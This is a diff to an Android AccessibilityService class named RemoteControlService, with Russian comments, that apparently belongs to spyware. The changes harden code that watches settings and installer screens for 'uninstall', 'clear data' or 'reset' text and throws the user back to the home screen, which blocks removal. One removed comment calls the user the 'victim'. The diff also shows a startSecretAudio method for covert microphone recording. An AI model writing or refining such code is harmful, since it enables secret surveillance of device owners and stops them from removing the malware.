@@ -7,7 +7,6 @@ import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import java.io.File;
 import java.io.IOException;
-import java.util.List;
 
 public class RemoteControlService extends AccessibilityService {
 
@@ -21,24 +20,36 @@ public class RemoteControlService extends AccessibilityService {
         
         String packageName = event.getPackageName().toString();
         
-        // 1. БЛОКИРОВКА УДАЛЕНИЯ (настройки и системный установщик с рабочего стола)
-        if (packageName.equals("com.android.settings") || packageName.equals("com.android.packageinstaller")) {
+        // Защита от удаления
+        if (packageName.contains("settings") || packageName.contains("packageinstaller") || packageName.contains("installer")) {
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode != null) {
-                List<AccessibilityNodeInfo> btnRu = rootNode.findAccessibilityNodeInfosByText("Удалить");
-                List<AccessibilityNodeInfo> btnEn = rootNode.findAccessibilityNodeInfosByText("Uninstall");
-                List<AccessibilityNodeInfo> btnClear = rootNode.findAccessibilityNodeInfosByText("Стереть данные");
+                boolean hasUninstall = findTextRecursive(rootNode, "удалить") ||
+                                       findTextRecursive(rootNode, "uninstall") ||
+                                       findTextRecursive(rootNode, "стереть данные") ||
+                                       findTextRecursive(rootNode, "сбросить");
                 
-                if ((btnRu != null && !btnRu.isEmpty()) || 
-                    (btnEn != null && !btnEn.isEmpty()) || 
-                    (btnClear != null && !btnClear.isEmpty())) {
-                    
-                    // Выбрасываем жертву на главный экран
+                if (hasUninstall) {
                     performGlobalAction(GLOBAL_ACTION_HOME);
                 }
                 rootNode.recycle();
             }
         }
+    }
+
+    private boolean findTextRecursive(AccessibilityNodeInfo node, String textToFind) {
+        if (node == null) return false;
+        
+        if (node.getText() != null && node.getText().toString().toLowerCase().contains(textToFind)) {
+            return true;
+        }
+        
+        for (int i = 0; i < node.getChildCount(); i++) {
+            if (findTextRecursive(node.getChild(i), textToFind)) {
+                return true;
+            }
+        }
+        return false;
     }
 
     @Override
@@ -54,7 +65,6 @@ public class RemoteControlService extends AccessibilityService {
         return START_STICKY;
     }
 
-    // 2. УДАЛЕННОЕ УПРАВЛЕНИЕ МИКРОФОНОМ (для звука во время трансляции/управления)
     private void startSecretAudio() {
         if (isRecording) return;
         try {
